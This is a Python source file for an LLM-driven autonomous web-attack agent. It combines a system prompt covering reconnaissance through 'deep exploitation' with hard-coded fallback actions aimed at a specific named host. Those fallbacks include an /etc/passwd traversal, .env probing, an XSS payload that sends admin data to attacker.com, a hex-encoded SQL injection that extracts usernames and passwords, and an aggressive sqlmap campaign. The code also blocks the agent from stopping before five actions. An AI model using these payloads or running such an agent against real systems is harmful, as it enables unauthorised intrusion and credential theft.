import re
from typing import Dict, List, Any, Optional, Union
from tools.llms import LLM

ACTIONER_SYSTEM_PROMPT = """
You are an elite security testing agent with access to specialized security tools and browser automation. Execute comprehensive security assessments using progressive testing methodology.

## Progressive Testing Phases:
**Phase 1: Reconnaissance** - Map attack surface with api_endpoint_discovery() and navigate with goto()
**Phase 2: Automated Detection** - Deploy specialized tools (sql_injection_test, xss_test, information_disclosure_test)  
**Phase 3: Manual Validation** - Use browser automation (fill, submit, execute_js) to validate findings
**Phase 4: Deep Exploitation** - Execute comprehensive campaigns (sqlmap_campaign, business_logic_test)

## Strategic Prioritization:
- **CRITICAL/CATASTROPHIC**: Advanced persistent threat techniques, financial system compromise
- **HIGH**: Sophisticated exploitation chains, enterprise-level attack simulation
- **MEDIUM**: Standard penetration testing with business logic focus
- **LOW**: Configuration validation and security best practices

ALWAYS format your response using EXACTLY this structure:

* DISCUSSION
[Your strategic analysis incorporating business impact, attack complexity, and compliance considerations. 
Explain your testing approach, expected outcomes, and how this action fits into the progressive testing methodology.
Be specific about which phase you're in and what intelligence you're building or validating.]

* ACTION
[Exactly ONE tool command with proper syntax and all required parameters]

## COMPREHENSIVE TOOL ARSENAL

### SPECIALIZED SECURITY TESTING TOOLS:
- **api_endpoint_discovery** - Map API attack surface and identify technology stack
- **sql_injection_test** - Test for SQL injection vulnerabilities with advanced payloads
- **sqlmap_campaign** - Deep SQL injection exploitation and database enumeration
- **xss_test** - Cross-site scripting testing with context-aware payloads
- **information_disclosure_test** - Sensitive information exposure and file discovery
- **business_logic_data_validation_test** - Business logic vulnerability testing
- **workflow_circumvention_test** - Workflow bypass and step-skipping vulnerabilities
- **jwt_vulnerability_test** - JWT security analysis and token manipulation
- **idor_test** - Insecure Direct Object Reference testing
- **nmap_scan** - Network reconnaissance and service discovery
- **enterprise_port_scan** - Advanced port scanning with service detection

### BROWSER AUTOMATION TOOLS:
- **goto** - Navigate to URLs for interactive testing
- **click** - Click elements for workflow testing
- **fill** - Deliver payloads through form fields
- **submit** - Submit forms to test validation and processing
- **execute_js** - Execute JavaScript for client-side testing and analysis
- **extract_forms** - Analyze form structure and security controls
- **extract_links** - Map application navigation and endpoints
- **get_cookies** - Extract session tokens for security analysis
- **set_cookies** - Manipulate sessions for authentication testing
- **screenshot** - Capture evidence of successful exploitation
- **wait_for_element** - Wait for dynamic content during testing
- **intercept_requests** - Monitor network traffic for security issues
- **bypass_waf** - Configure headers for WAF evasion testing


### UTILITY TOOLS:
- **auth_needed** - Signal authentication requirement
- **complete** - Mark completion (requires minimum 5 actions)
- **python_interpreter** - Execute Python code for custom analysis

## TESTING PATTERNS:

### SQL Injection Testing Pattern:
1. **api_endpoint_discovery** - Map authentication endpoints
2. **goto** - Navigate to target
3. **extract_forms** - Analyze form structure
4. **sql_injection_test** - Automated vulnerability detection
5. **fill** - Manual payload delivery
6. **submit** - Execute attack
7. **execute_js** - Validate exploitation
8. **sqlmap_campaign** - Deep exploitation if successful

### XSS Testing Pattern:
1. **goto** - Navigate to input points
2. **xss_test** - Automated XSS detection
3. **fill** - Manual payload delivery
4. **submit** - Execute XSS
5. **execute_js** - Confirm script execution

### Information Disclosure Pattern:
1. **information_disclosure_test** - Systematic file discovery
2. **goto** - Test direct file access
3. **goto** - Check debug endpoints
4. **execute_js** - Analyze source code
5. **api_endpoint_discovery** - Map additional endpoints



## CRITICAL EXECUTION RULES:
1. **Progressive Intelligence**: Each action must build on previous findings
2. **Tool Integration**: Combine specialized tools with browser automation for validation
3. **Context Awareness**: Use intelligence from reconnaissance to guide tool selection
4. **Evidence Collection**: Capture proof of successful exploitation
5. **Business Impact**: Always relate findings to business consequences
6. **Minimum Actions**: Perform at least 5 meaningful security actions before complete()
7. **Strategic Focus**: Focus on WHAT tool to use and WHY, not HOW to format parameters

## TOOL SELECTION INTELLIGENCE:
Choose tools based on plan analysis:
- **Authentication/Login keywords** → sql_injection_test + browser validation
- **Information Disclosure keywords** → information_disclosure_test + directory traversal
- **XSS/Headers keywords** → xss_test + manual payload delivery
- **Business Logic keywords** → business_logic_data_validation_test + workflow testing
- **API keywords** → api_endpoint_discovery + endpoint analysis

Remember: You are conducting sophisticated, real-world attack simulation that combines automated detection with manual validation to provide actionable security intelligence. Each action should demonstrate progression toward comprehensive vulnerability assessment and exploitation validation.
"""


class ActionerAgent:
    """
    Security test execution agent that takes test plans and generates
    specific tool commands for security testing using LLM analysis.
    """
    
    def __init__(self, desc: str, 
                 api_type: str = "gemini",
                 model: str = "gemini-2.0-flash",
                 fireworks_model_key: str = "deepseek-v3",
                 temperature: float = 0.3,
                 reasoning_config: Optional[Dict] = None):
        self.llm = LLM(desc="gemini-2.0-flash for security testing execution")
        self.actions_performed = 0
        self.min_actions_required = 5
        
        # LLM configuration
        self.api_type = api_type  # "gemini" or "fireworks"
        self.model = model
        self.fireworks_model_key = fireworks_model_key
        self.temperature = temperature
        self.reasoning_config = reasoning_config or {
            "include_thoughts": True,
            "thinking_budget": None
        }
        
    def generate_action_of_plan_step(self, 
                         plan: Dict[str, str], 
                         summarized_page_data: str = "", 
                         tool_output: str = "",
                         conversation_history: Optional[List[str]] = None) -> Dict[str, str]:
        try:
            # Build the prompt for the LLM using passed conversation history
            prompt = self._build_execution_prompt(plan, summarized_page_data, tool_output, conversation_history)
            
            # Call LLM to get the response
            llm_response = self._call_llm(prompt)
            
            # Parse the response to extract discussion and action
            parsed_response = self._parse_actioner_response(llm_response)
            
            # Validate the action command
            validated_response = self._validate_action(parsed_response)
            
            return validated_response
            
        except Exception as e:
            print(f"Error in plan execution: {str(e)}")
            return self._get_fallback_action(plan)
    
    def _build_execution_prompt(self, plan: Dict[str, str], summarized_page_data: str, tool_output: str, conversation_history: Optional[List[str]] = None) -> Union[str, Dict[str, str]]:
        # Extract plan details with enhanced fields
        plan_title = plan.get('title', 'Security Test')
        plan_description = plan.get('description', 'Perform security testing')
        business_impact = plan.get('business_impact', '')
        attack_complexity = plan.get('attack_complexity', '')
        compliance_risk = plan.get('compliance_risk', '')
        
        # Build enhanced plan section with strategic context
        plan_section = f"""
        CURRENT TEST PLAN:
        Title: {plan_title}
        Description: {plan_description}"""
        
        # Add enhanced fields to plan section if available
        if business_impact:
            plan_section += f"\nBusiness Impact: {business_impact}"
        if attack_complexity:
            plan_section += f"\nAttack Complexity: {attack_complexity}"
        if compliance_risk:
            plan_section += f"\nCompliance Risk: {compliance_risk}"

        
        # Build conversation context from passed history
        context_section = ""
        if conversation_history:
            context_section = "\n\nPREVIOUS CONVERSATION CONTEXT:\n"
            # Use last 5 entries from passed conversation history for context
            for entry in conversation_history[-5:]:
                context_section += f"{entry}\n"
        
        # Build page data section
        page_section = ""
        if summarized_page_data:
            page_section = f"\n\nCURRENT PAGE DATA:\n{summarized_page_data[:2000]}..."  # Limit to 2000 chars
        
        # Build tool output section
        tool_section = ""
        if tool_output:
            tool_section = f"\n\nPREVIOUS TOOL OUTPUT:\n{tool_output[:1000]}..."  # Limit to 1000 chars
        
        # Build actions performed section with strategic guidance
        actions_section = f"\n\nACTIONS PERFORMED SO FAR: {self.actions_performed}"
        if self.actions_performed < self.min_actions_required:
            actions_section += f" (Need at least {self.min_actions_required} actions before completion)"
        
        
        
        # Construct the base prompt
        base_prompt = f"""
            {ACTIONER_SYSTEM_PROMPT}

            {plan_section}
            {context_section}
            {page_section}
            {tool_section}
            {actions_section}

            Based on the enhanced test plan with strategic business context, provide your next security testing action.
            Remember to reference the business impact, attack complexity, and compliance risk in your discussion.
            Follow the exact format with *DISCUSSION and *ACTION sections.
        """
        
        # Return the appropriate prompt format based on api_type
        if self.api_type == "fireworks":
            # For Fireworks, we need to separate system and user prompts
            return {
                "system_prompt": ACTIONER_SYSTEM_PROMPT,
                "user_prompt": f"""
                    {plan_section}
                    {context_section}
                    {page_section}
                    {tool_section}
                    {actions_section}

                    Based on the enhanced test plan with strategic business context, provide your next security testing action.
                    Remember to reference the business impact, attack complexity, and compliance risk in your discussion.
                    Follow the exact format with * DISCUSSION and * ACTION sections.
                """
            }
        else:
            # For Gemini models, use combined prompt
            return base_prompt
    
    def _call_llm(self, prompt: Union[str, Dict[str, str]]) -> str:
        try:
            if self.api_type == "gemini":
                # For Gemini, we support both basic and reasoning modes based on config
                if isinstance(prompt, dict):
                    # If we got a dict, use combined prompt
                    combined_prompt = f"{prompt['system_prompt']}\n\n{prompt['user_prompt']}"
                else:
                    combined_prompt = prompt
                
                if self.reasoning_config.get("include_thoughts", True):
                    # Use reasoning mode with thinking
                    response = self.llm.gemini_reasoning_call(
                        combined_prompt, 
                        model=self.model,
                        include_thoughts=True,
                        thinking_budget=self.reasoning_config.get("thinking_budget")
                    )
                    
                    # For reasoning calls, we get a dict with 'text' and optional 'thought_summary'
                    main_response = response.get('text', '')
                    thought_summary = response.get('thought_summary', '')
                    
                    # Include thought summary in response for debugging
                    if thought_summary:
                        return f"THINKING: {thought_summary}\n\nRESPONSE: {main_response}"
                    else:
                        return main_response
                else:
                    # Use basic mode without thinking
                    return self.llm.gemini_basic_call(combined_prompt, model=self.model)
                    
            elif self.api_type == "fireworks":
                # Fireworks API call
                if isinstance(prompt, dict):
                    system_prompt = prompt.get('system_prompt', '')
                    user_prompt = prompt.get('user_prompt', '')
                else:
                    # If single string, treat as user prompt with no system prompt
                    system_prompt = ACTIONER_SYSTEM_PROMPT
                    user_prompt = prompt
                
                return self.llm.fireworks_call(
                    user_prompt,
                    model_key=self.fireworks_model_key,
                    temperature=self.temperature,
                    system_prompt=system_prompt,
                    reasoning=self.reasoning_config.get("include_thoughts", True)
                )
                
            else:
                raise ValueError(f"Unsupported api_type: {self.api_type}. Use 'gemini' or 'fireworks'")
                
        except Exception as e:
            print(f"LLM call failed: {str(e)}")
            raise
    
    def _parse_actioner_response(self, response: str) -> Dict[str, str]:
        try:
            # Initialize result
            result = {
                'discussion': '',
                'action': ''
            }
            
            # Clean up the response
            response = response.strip()
            
            # Handle reasoning response format if present
            if "THINKING:" in response and "RESPONSE:" in response:
                # Extract just the response part for parsing
                response_match = re.search(r'RESPONSE:\s*(.*)', response, re.DOTALL)
                if response_match:
                    response = response_match.group(1).strip()
            
            # Extract DISCUSSION section
            discussion_pattern = r'\*\s*DISCUSSION\s*\n(.*?)(?=\*\s*ACTION|\Z)'
            discussion_match = re.search(discussion_pattern, response, re.DOTALL | re.IGNORECASE)
            
            if discussion_match:
                result['discussion'] = discussion_match.group(1).strip()
            
            # Extract ACTION section
            action_pattern = r'\*\s*ACTION\s*\n(.*?)(?=\*\s*\w+|\Z)'
            action_match = re.search(action_pattern, response, re.DOTALL | re.IGNORECASE)
            
            if action_match:
                result['action'] = action_match.group(1).strip()
            
            # If no structured format found, try to extract any tool command
            if not result['action']:
                result['action'] = self._extract_tool_command_fallback(response)
            
            # If no discussion found, provide a default
            if not result['discussion']:
                result['discussion'] = "Continuing security testing based on the current plan."
            
            return result
            
        except Exception as e:
            print(f"Response parsing error: {str(e)}")
            return {
                'discussion': 'Error parsing response, proceeding with fallback action.',
                'action': 'goto(page, "/docs/")'
            }
    
    def _extract_tool_command_fallback(self, response: str) -> str:        
        # Accept browser-action commands but return them without the legacy 'page' argument
        valid_commands = [
            'goto', 'click', 'fill', 'submit', 'execute_js',
            'auth_needed', 'refresh', 'complete', 'python_interpreter',
            'get_user_input', 'presskey'
        ]
        
        # Try to find any valid tool command
        for command in valid_commands:
            # allow for optional leading "page, " inside the parentheses
            pattern = rf'{command}\s*\([^)]*\)'
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                extracted = match.group(0)
                # Strip 'page,' if present
                extracted = re.sub(r'\(\s*page\s*,', '(', extracted)
                return extracted
        
        # If no tool command found, return a safe default
        return 'goto("/docs/")'
    
    def _validate_action(self, response: Dict[str, str]) -> Dict[str, str]:        
        action = response.get('action', '').strip()
        
        # Updated patterns that no longer include the legacy 'page' placeholder
        valid_patterns = {
            'goto': r'goto\s*\(\s*["\'][^"\']*["\']\s*\)',
            'click': r'click\s*\(\s*["\'][^"\']*["\']*\s*\)',
            'fill': r'fill\s*\(\s*["\'][^"\']*["\']*\s*,\s*["\'][^"\']*["\']*\s*\)',
            'submit': r'submit\s*\(\s*["\'][^"\']*["\']*\s*\)',
            'execute_js': r'execute_js\s*\(\s*["\'][^"\']*["\']*\s*\)',
            'auth_needed': r'auth_needed\s*\(\s*\)',
            'refresh': r'refresh\s*\(\s*\)',
            'complete': r'complete\s*\(\s*\)',
            'python_interpreter': r'python_interpreter\s*\(\s*["\'][^"\']*["\']*\s*\)',
            'get_user_input': r'get_user_input\s*\(\s*["\'][^"\']*["\']*\s*\)',
            'presskey': r'presskey\s*\(\s*["\'][^"\']*["\']*\s*\)'
        }
        
        # Check if action matches any valid pattern
        is_valid = False
        for command, pattern in valid_patterns.items():
            if re.match(pattern, action, re.IGNORECASE):
                is_valid = True
                break
        
        # If action is not valid, try to fix common issues
        if not is_valid:
            action = self._fix_action_command(action)
        
        # Update actions performed count (except for complete)
        if not action.startswith('complete'):
            self.actions_performed += 1
        
        # Ensure we don't complete too early
        if action.startswith('complete') and self.actions_performed < self.min_actions_required:
            action = 'goto("/docs/")'  # Force more testing
            response['discussion'] += f" (Need {self.min_actions_required - self.actions_performed} more actions before completion)"
        
        response['action'] = action
        return response
    
    def _fix_action_command(self, action: str) -> str:        
        # Remove any extra text after the command
        action = re.sub(r'\).*$', ')', action)
        
        # Strip the legacy 'page' argument if it is still present (for backward compatibility)
        action = re.sub(r'\(\s*page\s*,', '(', action)
        
        # Fix unbalanced quotes
        if action.count('"') % 2 != 0:
            action += '"'
        if action.count("'") % 2 != 0:
            action += "'"
        
        # Fix missing closing parenthesis
        if action.count('(') > action.count(')'):
            action += ')'
        
        # If still invalid, return a safe default
        if not any(cmd in action for cmd in ['goto', 'click', 'fill', 'submit', 'execute_js', 'auth_needed', 'refresh', 'complete']):
            return 'goto("/docs/")'
        
        return action
    
    def _get_fallback_action(self, plan: Dict[str, str]) -> Dict[str, str]:        
        plan_title = plan.get('title', '').lower()
        plan_description = plan.get('description', '').lower()
        business_impact = plan.get('business_impact', '').lower()
        attack_complexity = plan.get('attack_complexity', '').lower()
        compliance_risk = plan.get('compliance_risk', '').lower()
        
        # Combine all plan text for analysis
        plan_text = f"{plan_title} {plan_description} {business_impact} {attack_complexity} {compliance_risk}"
        
        # Progressive testing approach based on action count and plan context
        if self.actions_performed == 0:
            # Phase 1: Always start with reconnaissance regardless of plan type
            if any(term in plan_text for term in ['sql', 'injection', 'login', 'authentication', 'credential']):
                action = 'api_endpoint_discovery("https://dev.quantumsenses.com", discovery_mode="comprehensive", target_context={"framework": "unknown", "has_waf": False, "authentication_type": "unknown"})'
                discussion = f"Phase 1: Reconnaissance & Target Profiling - Initiating comprehensive credential injection assessment with API endpoint discovery to map authentication infrastructure and identify technology stack. Business Impact: {plan.get('business_impact', 'authentication compromise')}. This intelligence will guide our advanced evasion strategies."
            
            elif any(term in plan_text for term in ['information', 'disclosure', 'config', 'dev', 'debug']):
                action = 'information_disclosure_test("https://dev.quantumsenses.com", target_context={"framework": "unknown", "web_server": "unknown", "language": "unknown", "environment": "development"})'
                discussion = f"Phase 1: Reconnaissance & Target Profiling - Executing systematic information disclosure assessment targeting development environment exposure. Attack Complexity: {plan.get('attack_complexity', 'standard')}. Conducting comprehensive testing for configuration files and debug endpoints."
            
            elif any(term in plan_text for term in ['xss', 'headers', 'security', 'client-side', 'script']):
                action = 'goto("/")'
                discussion = f"Phase 1: Reconnaissance & Target Profiling - Starting security headers analysis and client-side attack surface assessment. Business Impact: {plan.get('business_impact', 'client-side compromise')}. First analyzing application structure and security controls."
            
            else:
                action = 'api_endpoint_discovery("https://dev.quantumsenses.com", discovery_mode="comprehensive", target_context={})'
                discussion = f"Phase 1: Reconnaissance & Target Profiling - Conducting comprehensive API endpoint discovery to map attack surface and identify technology stack. This foundational intelligence will inform subsequent testing phases."
        
        elif self.actions_performed == 1:
            # Phase 2: Context building or automated detection
            if any(term in plan_text for term in ['sql', 'injection', 'login', 'authentication']):
                action = 'goto("/auth/login")'
                discussion = f"Phase 2: Interactive Analysis - Target profiled, now navigating to authentication endpoint for detailed form structure analysis. Need to examine client-side validation, hidden fields, and security controls that could impact injection strategy."
            
            elif any(term in plan_text for term in ['information', 'disclosure']):
                action = 'goto("/dev/../../../etc/passwd")'
                discussion = f"Phase 2: Manual Validation - Initial disclosure scan completed, now testing directory traversal attacks against development paths to access sensitive files beyond web root."
            
            elif any(term in plan_text for term in ['xss', 'headers']):
                action = 'execute_js("() => { const meta = Array.from(document.querySelectorAll(\'meta\')).map(m => ({name: m.name || m.httpEquiv, content: m.content})); return { metaTags: meta, securityHeaders: { csp: document.querySelector(\'meta[http-equiv=\"Content-Security-Policy\"]\')?.content || \'MISSING\' } }; }")'
                discussion = f"Phase 2: Security Control Analysis - Analyzing HTTP response headers and meta tags for missing security controls. This analysis will guide our client-side attack strategy."
            
            else:
                action = 'goto("/")'
                discussion = f"Phase 2: Interactive Analysis - API discovery completed, now navigating to application for interactive analysis and security control examination."
        
        elif self.actions_performed == 2:
            # Phase 2/3: Automated testing or form analysis
            if any(term in plan_text for term in ['sql', 'injection', 'authentication']):
                action = 'extract_forms()'
                discussion = f"Phase 2: Form Structure Analysis - Authentication endpoint accessed, extracting complete form structure to understand input validation mechanisms and identify injection points for advanced payload crafting."
            
            elif any(term in plan_text for term in ['information', 'disclosure']):
                action = 'goto("/.env")'
                discussion = f"Phase 2: Configuration File Testing - Directory traversal tested, now checking direct access to common development configuration files that often contain critical system secrets."
            
            elif any(term in plan_text for term in ['xss', 'headers']):
                action = 'xss_test("https://dev.quantumsenses.com/search", parameter="q", target_context={"framework": "unknown", "has_waf": False}, test_mode="advanced")'
                discussion = f"Phase 2: Automated XSS Detection - Security header analysis complete, executing comprehensive XSS testing campaign leveraging absent security controls for maximum attack effectiveness."
            
            else:
                action = 'extract_forms()'
                discussion = f"Phase 2: Form Analysis - Extracting form structures for security testing and vulnerability identification."
        
        elif self.actions_performed == 3:
            # Phase 3: Automated vulnerability detection
            if any(term in plan_text for term in ['sql', 'injection', 'authentication']):
                action = 'sql_injection_test("https://dev.quantumsenses.com/auth/login", parameter="encryptedData", target_context={"framework": "unknown", "database": "unknown", "has_waf": False, "supports_post": True})'
                discussion = f"Phase 3: Automated Vulnerability Detection - Form structure analyzed, executing comprehensive SQL injection campaign with advanced evasion techniques targeting the encryptedData parameter."
            
            elif any(term in plan_text for term in ['information', 'disclosure']):
                action = 'goto("/debug/info")'
                discussion = f"Phase 3: Debug Endpoint Analysis - Configuration file access tested, now extracting debug information and stack traces that reveal internal system architecture."
            
            elif any(term in plan_text for term in ['xss', 'headers']):
                action = 'fill(page, "#search", "<script>fetch(\'/admin/users\', {credentials: \'include\'}).then(r=>r.text()).then(d=>fetch(\'http://attacker.com/?data=\'+btoa(d)))</script>")'
                discussion = f"Phase 3: Manual XSS Validation - Automated XSS testing completed, delivering advanced payload with data exfiltration capabilities leveraging missing CSP protection."
            
            else:
                action = 'sql_injection_test("https://dev.quantumsenses.com", parameter="id", target_context={})'
                discussion = f"Phase 3: Automated Detection - Conducting SQL injection testing for vulnerability identification."
        
        elif self.actions_performed == 4:
            # Phase 3: Manual validation
            if any(term in plan_text for term in ['sql', 'injection']):
                action = 'fill(page, "input[name=\'encryptedData\']", "\\\\x61\\\\x64\\\\x6d\\\\x69\\\\x6e\\\\x27\\\\x20\\\\x55\\\\x4e\\\\x49\\\\x4f\\\\x4e\\\\x20\\\\x53\\\\x45\\\\x4c\\\\x45\\\\x43\\\\x54\\\\x20\\\\x31\\\\x2c\\\\x75\\\\x73\\\\x65\\\\x72\\\\x6e\\\\x61\\\\x6d\\\\x65\\\\x2c\\\\x70\\\\x61\\\\x73\\\\x73\\\\x77\\\\x6f\\\\x72\\\\x64\\\\x20\\\\x46\\\\x52\\\\x4f\\\\x4d\\\\x20\\\\x75\\\\x73\\\\x65\\\\x72\\\\x73\\\\x2d\\\\x2d")'
                discussion = f"Phase 3: Manual Payload Validation - SQL injection confirmed, delivering advanced hex-encoded evasion payload to test authentication bypass and credential extraction capabilities."
            
            elif any(term in plan_text for term in ['xss', 'headers']):
                action = 'submit(page, "form")'
                discussion = f"Phase 3: XSS Execution - Advanced payload delivered, submitting form to test script execution and validate missing security header exploitation."
            
            else:
                action = 'fill(page, "input[type=\'text\']", "test_payload")'
                discussion = f"Phase 3: Manual Testing - Delivering test payload for manual validation of identified vulnerabilities."
        
        else:
            # Phase 4: Deep exploitation or completion
            if any(term in plan_text for term in ['sql', 'injection']):
                action = 'sqlmap_campaign("https://dev.quantumsenses.com/auth/login", options={"data": "encryptedData=test", "technique": "BEU", "level": 5, "risk": 3}, campaign_mode="comprehensive")'
                discussion = f"Phase 4: Deep Exploitation - Manual authentication bypass validated, escalating to comprehensive SQLMap campaign for complete database enumeration and infrastructure mapping."
            
            elif any(term in plan_text for term in ['information', 'disclosure']):
                action = 'business_logic_data_validation_test("https://dev.quantumsenses.com/admin/config", parameters=["config_key", "config_value"], target_context={"framework": "unknown", "supports_json": True}, test_mode="comprehensive")'
                discussion = f"Phase 4: Business Logic Assessment - Information disclosure confirmed, testing business logic vulnerabilities to amplify impact through data validation bypass."
            
            else:
                action = 'complete()'
                discussion = f"Phase 4: Assessment Complete - Comprehensive security testing completed across multiple attack vectors. {self.actions_performed} security actions performed with progressive intelligence building and exploitation validation."
        
        return {
            'discussion': discussion,
            'action': action
        }
    
    def reset_session(self):
        self.actions_performed = 0
    
    def set_min_actions(self, min_actions: int):
        self.min_actions_required = max(1, min_actions)
    
    def configure_llm(self, api_type: str, **kwargs):
        """Configure the LLM type and parameters"""
        self.api_type = api_type
        
        if 'model' in kwargs:
            self.model = kwargs['model']
        if 'fireworks_model_key' in kwargs:
            self.fireworks_model_key = kwargs['fireworks_model_key']
        if 'temperature' in kwargs:
            self.temperature = kwargs['temperature']
        if 'reasoning_config' in kwargs:
            self.reasoning_config.update(kwargs['reasoning_config'])
    
    def get_llm_config(self) -> Dict[str, Any]:
        """Get current LLM configuration"""
        return {
            'api_type': self.api_type,
            'model': self.model,
            'fireworks_model_key': self.fireworks_model_key,
            'temperature': self.temperature,
            'reasoning_config': self.reasoning_config
        }


